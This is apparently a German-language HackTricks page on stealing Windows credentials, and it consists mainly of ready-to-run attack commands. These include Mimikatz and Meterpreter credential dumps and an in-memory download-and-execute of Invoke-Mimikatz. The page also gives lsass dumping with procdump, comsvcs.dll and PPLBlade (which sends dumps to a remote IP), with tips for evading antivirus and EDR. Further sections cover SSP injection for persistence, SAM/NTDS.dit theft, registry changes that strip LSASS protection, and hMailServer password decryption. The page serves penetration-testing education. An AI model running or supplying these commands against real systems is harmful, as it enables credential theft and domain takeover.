# Windows Credentials stehlen

{{#include ../../banners/hacktricks-training.md}}

## Credentials Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Finde weitere Dinge, die Mimikatz tun kann auf** [**this page**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Erfahren Sie hier mehr über mögliche Schutzmaßnahmen für credentials.**](credentials-protections.md) **Diese Schutzmaßnahmen könnten verhindern, dass Mimikatz einige credentials extrahiert.**

## Credentials mit Meterpreter

Verwenden Sie das [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials), **das** ich erstellt habe, um nach passwords und hashes auf dem Opfer zu suchen.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## AV umgehen

### Procdump + Mimikatz

Da **Procdump von** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**ein legitimes Microsoft-Tool ist**, wird es von Defender nicht erkannt.\
Sie können dieses Tool verwenden, um **dump the lsass process**, **download the dump** und **extract the credentials locally** aus dem Dump.

Sie können auch [SharpDump](https://github.com/GhostPack/SharpDump) verwenden.
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
Dieser Prozess wird automatisch mit [SprayKatz](https://github.com/aas-n/spraykatz) durchgeführt: `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Hinweis**: Manche **AV** können die Verwendung von **procdump.exe to dump lsass.exe** als **bösartig** **erkennen**, das liegt daran, dass sie die Zeichenfolge **"procdump.exe" and "lsass.exe"** **erkennen**. Daher ist es **unauffälliger**, die **PID** von lsass.exe als **Argument** an procdump **zu übergeben**, **anstatt** den **Namen lsass.exe** zu verwenden.

### Dumping von lsass mit **comsvcs.dll**

Eine DLL namens **comsvcs.dll**, die in `C:\Windows\System32` zu finden ist, ist verantwortlich für das **Dumpen des Prozessspeichers** im Falle eines Absturzes. Diese DLL enthält eine **Funktion** namens **`MiniDumpW`**, die über `rundll32.exe` aufgerufen werden kann.\
Die ersten beiden Argumente sind irrelevant, das dritte jedoch ist in drei Komponenten unterteilt. Die Prozess-ID, die gedumpt werden soll, bildet die erste Komponente, der Speicherort der Dump-Datei stellt die zweite dar, und die dritte Komponente ist strikt das Wort **full**. Es gibt keine Alternativen.\
Nachdem diese drei Komponenten geparst wurden, erstellt die DLL die Dump-Datei und schreibt den Speicher des angegebenen Prozesses in diese Datei.\
Die Verwendung der **comsvcs.dll** ermöglicht es, den lsass-Prozess zu dumpen, sodass das Hochladen und Ausführen von procdump entfällt. Diese Methode wird ausführlich beschrieben unter [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords/).

Der folgende Befehl wird zur Ausführung verwendet:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Sie können diesen Prozess mit** [**lssasy**](https://github.com/Hackndo/lsassy)** automatisieren.**

### **Dumping lsass mit Task Manager**

1. Klicken Sie mit der rechten Maustaste auf die Taskleiste und wählen Sie Task Manager
2. Klicken Sie auf "Mehr Details"
3. Suchen Sie im Tab "Processes" nach dem Prozess "Local Security Authority Process"
4. Klicken Sie mit der rechten Maustaste auf den Prozess "Local Security Authority Process" und wählen Sie "Create dump file".

### Dumping lsass mit procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) ist eine von Microsoft signierte Binärdatei, die Teil der [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) Suite ist.
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Dumping von lsass mit PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) ist ein Protected Process Dumper Tool, das das Verschleiern von memory dump und deren Übertragung auf Remote-Workstations unterstützt, ohne diese auf die Festplatte abzulegen.

**Hauptfunktionen**:

1. Bypassing PPL protection
2. Verschleiern von memory dump-Dateien, um Defender signaturbasierte Erkennungsmechanismen zu umgehen
3. Upload von memory dump mit RAW- und SMB-Upload-Methoden, ohne diese auf die Festplatte abzulegen (fileless dump)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – SSP-basierter LSASS-Dumping ohne MiniDumpWriteDump

Ink Dragon liefert einen dreistufigen Dumper namens **LalsDumper**, der niemals `MiniDumpWriteDump` aufruft, sodass EDR-Hooks auf diese API nie ausgelöst werden:

1. **Stage 1 loader (`lals.exe`)** – durchsucht `fdp.dll` nach einem Platzhalter, der aus 32 Kleinbuchstaben `d` besteht, überschreibt ihn mit dem absoluten Pfad zu `rtu.txt`, speichert die gepatchte DLL als `nfdp.dll` und ruft `AddSecurityPackageA("nfdp","fdp")` auf. Dadurch wird **LSASS** dazu gezwungen, die bösartige DLL als neuen Security Support Provider (SSP) zu laden.
2. **Stage 2 inside LSASS** – wenn LSASS `nfdp.dll` lädt, liest die DLL `rtu.txt`, XORt jedes Byte mit `0x20` und mappt den dekodierten Blob in den Speicher, bevor die Ausführung übergeben wird.
3. **Stage 3 dumper** – der gemappte Payload implementiert die MiniDump-Logik neu, wobei **direct syscalls** verwendet werden, die aus gehashten API-Namen aufgelöst werden (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Ein dedizierter Export namens `Tom` öffnet `%TEMP%\<pid>.ddt`, schreibt einen komprimierten LSASS-Dump in die Datei und schließt das Handle, sodass eine spätere Exfiltration möglich ist.

Hinweise für Operatoren:

* Behalte `lals.exe`, `fdp.dll`, `nfdp.dll` und `rtu.txt` im selben Verzeichnis. Stage 1 überschreibt den hartkodierten Platzhalter mit dem absoluten Pfad zu `rtu.txt`, daher bricht das Aufteilen die Kette.
* Die Registrierung erfolgt durch Anhängen von `nfdp` an `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Sie können diesen Wert selbst setzen, damit LSASS die SSP bei jedem Boot neu lädt.
* `%TEMP%\*.ddt`-Dateien sind komprimierte Dumps. Lokal dekomprimieren und dann an Mimikatz/Volatility zur Credential-Extraktion übergeben.
* Zum Ausführen von `lals.exe` sind Admin-/SeTcb-Rechte erforderlich, damit `AddSecurityPackageA` erfolgreich ist; sobald der Aufruf zurückkehrt, lädt LSASS den Rogue-SSP transparent und führt Stage 2 aus.
* Das Entfernen der DLL von der Festplatte entfernt sie nicht aus LSASS. Entweder den Registrierungseintrag löschen und LSASS neu starten (Reboot) oder die DLL für langfristige Persistenz belassen.

## CrackMapExec

### Dump SAM hashes
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### LSA-Secrets auslesen
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### NTDS.dit vom Ziel-DC auslesen
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### NTDS.dit Passwortverlauf vom Ziel-DC auslesen
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Zeige das Attribut pwdLastSet für jedes NTDS.dit account
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Stehlen von SAM & SYSTEM

Diese Dateien sollten sich in _C:\windows\system32\config\SAM_ und _C:\windows\system32\config\SYSTEM._ Aber **du kannst sie nicht einfach auf normale Weise kopieren**, weil sie geschützt sind.

### Aus der Registry

Der einfachste Weg, diese Dateien zu stehlen, ist, eine Kopie aus der Registry zu bekommen:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Lade** diese Dateien auf deine Kali-Maschine herunter und **extrahiere die hashes** mit:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Sie können Kopien geschützter Dateien mit diesem Dienst erstellen. Sie müssen Administrator sein.

#### Verwendung von vssadmin

Die vssadmin binary ist nur in Windows Server versions verfügbar.
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Aber du kannst dasselbe auch mit **Powershell** tun. Dies ist ein Beispiel dafür, **wie man die SAM file kopiert** (das verwendete Laufwerk ist "C:" und es wird nach C:\users\Public gespeichert), aber du kannst dies verwenden, um jede geschützte Datei zu kopieren:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
Code aus dem Buch: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)

### Invoke-NinjaCopy

Schließlich können Sie auch das [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) verwenden, um eine Kopie von SAM, SYSTEM und ntds.dit zu erstellen.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory Anmeldeinformationen - NTDS.dit**

Die **NTDS.dit**-Datei ist als Herz von **Active Directory** bekannt und enthält wichtige Daten über Benutzerobjekte, Gruppen und deren Mitgliedschaften. Hier werden die **password hashes** der Domain-Benutzer gespeichert. Diese Datei ist eine **Extensible Storage Engine (ESE)**-Datenbank und liegt unter **_%SystemRoom%/NTDS/ntds.dit_**.

Innerhalb dieser Datenbank werden drei Haupttabellen gepflegt:

- **Data Table**: Diese Tabelle speichert Details über Objekte wie Benutzer und Gruppen.
- **Link Table**: Sie verfolgt Beziehungen, z. B. Gruppenmitgliedschaften.
- **SD Table**: **Security descriptors** für jedes Objekt werden hier abgelegt und sorgen für die Sicherheit und Zugriffskontrolle der gespeicherten Objekte.

More information about this: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows uses _Ntdsa.dll_ to interact with that file and its used by _lsass.exe_. Then, **part** of the **NTDS.dit** file could be located **inside the `lsass`** memory (you can find the latest accessed data probably because of the performance improve by using a **cache**).

#### Entschlüsseln der Hashes in NTDS.dit

Der Hash ist dreifach verschlüsselt:

1. Den Password Encryption Key (**PEK**) mit dem **BOOTKEY** und **RC4** entschlüsseln.
2. Den **hash** mit **PEK** und **RC4** entschlüsseln.
3. Den **hash** mit **DES** entschlüsseln.

**PEK** hat den **gleichen Wert** auf jedem **Domain Controller**, wird aber innerhalb der **NTDS.dit**-Datei mit dem **BOOTKEY** der **SYSTEM**-Datei des jeweiligen **Domain Controller** verschlüsselt (ist zwischen Domain Controllern unterschiedlich). Deshalb benötigt man, um die Anmeldeinformationen aus der NTDS.dit-Datei zu erhalten, die Dateien **NTDS.dit** und **SYSTEM** (_C:\Windows\System32\config\SYSTEM_).

### Kopieren von NTDS.dit mit Ntdsutil

Verfügbar seit Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Sie können auch den [**volume shadow copy**](#stealing-sam-and-system)-Trick verwenden, um die **ntds.dit**-Datei zu kopieren. Denken Sie daran, dass Sie außerdem eine Kopie der **SYSTEM file** benötigen (ebenfalls, [**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system)-Trick).

### **Hashes aus NTDS.dit extrahieren**

Sobald Sie die Dateien **NTDS.dit** und **SYSTEM** **erhalten** haben, können Sie Tools wie _secretsdump.py_ verwenden, um die **Hashes zu extrahieren**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Sie können sie auch **automatisch extrahieren**, indem Sie einen gültigen domain admin user verwenden:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Für **big NTDS.dit files** wird empfohlen, diese mit [gosecretsdump](https://github.com/c-sto/gosecretsdump) zu extrahieren.

Schließlich können Sie auch das **metasploit module** verwenden: _post/windows/gather/credentials/domain_hashdump_ oder **mimikatz** `lsadump::lsa /inject`

### **Extracting domain objects from NTDS.dit to an SQLite database**

NTDS-Objekte können mit [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite) in eine SQLite-Datenbank extrahiert werden. Es werden nicht nur secrets extrahiert, sondern auch die gesamten Objekte und ihre Attribute für weitergehende Informationsgewinnung, sofern die rohe NTDS.dit-Datei bereits beschafft wurde.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
Der `SYSTEM` hive ist optional, erlaubt jedoch die Entschlüsselung von Secrets (NT & LM hashes, supplemental credentials wie cleartext passwords, kerberos oder trust keys, NT & LM password histories). Zusammen mit anderen Informationen werden folgende Daten extrahiert: Benutzer- und Maschinenkonten mit ihren Hashes, UAC flags, Zeitstempel für letzten logon und password change, Kontobeschreibungen, Namen, UPN, SPN, Gruppen und rekursive Mitgliedschaften, organizational units tree und Mitgliedschaften, trusted domains mit trusts type, direction und attributes...

## Lazagne

Download the binary from [here](https://github.com/AlessandroZ/LaZagne/releases). Sie können dieses binary verwenden, um credentials aus verschiedener Software zu extrahieren.
```
lazagne.exe all
```
## Weitere Tools zum Extrahieren von credentials aus SAM und LSASS

### Windows credentials Editor (WCE)

Dieses Tool kann verwendet werden, um credentials aus dem Speicher zu extrahieren. Zum Download: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Extrahiert credentials aus der SAM-Datei
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Anmeldedaten aus der SAM-Datei extrahieren
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Lade es herunter von:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) und führe es einfach **aus** — die Passwörter werden extrahiert.

## Inaktive RDP-Sitzungen ausnutzen und Sicherheitskontrollen schwächen

Ink Dragon’s FinalDraft RAT enthält einen `DumpRDPHistory`-Tasker, dessen Techniken für jeden Red-Teamer nützlich sind:

### DumpRDPHistory-ähnliche Telemetrie-Erfassung

* **Outbound RDP targets** – analysiere jede Benutzer-Hive unter `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Jeder Unterschlüssel speichert den Servernamen, `UsernameHint` und den Zeitstempel der letzten Änderung. Du kannst FinalDrafts Logik mit PowerShell nachbilden:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Inbound RDP evidence** – frage das Protokoll `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` nach Event IDs **21** (erfolgreiche Anmeldung) und **25** (Trennung) ab, um zuzuordnen, wer die Maschine administriert hat:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

Sobald du weißt, welcher Domain Admin regelmäßig verbindet, dump LSASS (mit LalsDumper/Mimikatz), solange deren **disconnected** Sitzung noch besteht. CredSSP + NTLM fallback hinterlässt deren Verifier und Tokens in LSASS, die dann über SMB/WinRM wieder abgespielt werden können, um `NTDS.dit` zu erlangen oder Persistence auf domain controllers vorzubereiten.

### Registry-Downgrades, die FinalDraft anvisiert
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* Das Setzen von `DisableRestrictedAdmin=1` erzwingt die vollständige Wiederverwendung von Anmeldeinformationen/Tickets bei RDP und ermöglicht pass-the-hash-ähnliche Pivot-Vorgänge.
* `LocalAccountTokenFilterPolicy=1` deaktiviert die UAC-Tokenfilterung, sodass lokale Administratoren über das Netzwerk uneingeschränkte Tokens erhalten.
* `DSRMAdminLogonBehavior=2` erlaubt dem DSRM-Administrator die Anmeldung, während der DC online ist, und verschafft Angreifern ein weiteres integriertes Konto mit hohen Rechten.
* `RunAsPPL=0` entfernt LSASS PPL-Schutzmaßnahmen, wodurch der Speicherzugriff für Dumper wie LalsDumper einfach wird.

## hMailServer database credentials (post-compromise)

hMailServer speichert sein DB-Passwort in `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` unter `[Database] Password=`. Der Wert ist Blowfish-verschlüsselt mit dem statischen Schlüssel `THIS_KEY_IS_NOT_SECRET` und 4-byte word endianness swaps. Verwende den Hex-String aus der INI mit diesem Python-Snippet:
```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```
Mit dem clear-text password die SQL CE-Datenbank kopieren, um Dateisperren zu vermeiden, den 32-Bit-Provider laden und bei Bedarf upgraden, bevor hashes abgefragt werden:
```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```
Die `accountpassword`-Spalte verwendet das hMailServer-Hash-Format (hashcat mode `1421`). Das Knacken dieser Werte kann wiederverwendbare Anmeldeinformationen für WinRM/SSH pivots liefern.

## LSA Logon Callback Interception (LsaApLogonUserEx2)

Einige Tools erfassen **Klartext-Anmeldepasswörter**, indem sie den LSA-Logon-Callback `LsaApLogonUserEx2` abfangen. Die Idee ist, die authentication package callback zu hooken oder zu wrappen, sodass Anmeldeinformationen **während des Logons** (vor dem Hashing) erfasst und dann auf die Festplatte geschrieben oder an den Operator zurückgegeben werden. Üblicherweise wird dies als Helper implementiert, der sich in LSA injected oder bei LSA registriert und dann jedes erfolgreiche interactive/network logon-Ereignis mit Benutzername, Domain und Passwort aufzeichnet.

Betriebsnotizen:
- Erfordert local admin/SYSTEM, um den helper im authentication path zu laden.
- Erfasste credentials erscheinen nur, wenn ein Logon stattfindet (interactive, RDP, service oder network logon, abhängig vom hook).

## SSMS Saved Connection Credentials (sqlstudio.bin)

SQL Server Management Studio (SSMS) speichert gespeicherte Verbindungsinformationen in einer pro-Benutzer-`sqlstudio.bin`-Datei. Dedizierte Dumper können die Datei parsen und gespeicherte SQL-Credentials wiederherstellen. In Shells, die nur Kommandoausgabe zurückgeben, wird die Datei oft exfiltriert, indem sie als Base64 kodiert und auf stdout ausgegeben wird.
```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```
Auf der Operator-Seite die Datei neu erstellen und den dumper lokal ausführen, um credentials wiederherzustellen:
```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```
## Referenzen

- [Unit 42 – Eine Untersuchung jahrelanger unentdeckter Operationen, die auf Sektoren mit hohem Wert abzielen](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [Check Point Research – Inside Ink Dragon: Enthüllung des Relay-Netzwerks und der inneren Funktionsweise einer verdeckten Offensivoperation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../../banners/hacktricks-training.md}}
